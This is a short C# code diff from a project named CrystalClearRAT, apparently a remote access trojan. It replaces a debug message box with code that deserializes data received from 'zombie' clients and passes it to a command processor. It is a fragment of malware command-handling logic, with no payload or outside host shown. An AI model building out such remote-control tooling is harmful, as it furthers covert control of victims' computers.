@@ -8,7 +8,9 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Input;
+using CrystalClearRAT.Functions;
 using CrystalClearRAT.ZombieModel;
+using CrystalRATShared.Serialization;
 
 namespace CrystalClearRAT.Web
 {
@@ -145,8 +147,7 @@ namespace CrystalClearRAT.Web
 
             ms.Dispose();
 
-
-            System.Windows.MessageBox.Show((System.Text.Encoding.UTF8.GetString(data)));
+            CommandDataSerializer.Deserialize(data, FunctionManager.Process);
 
             Receive(state.Zombie);
 
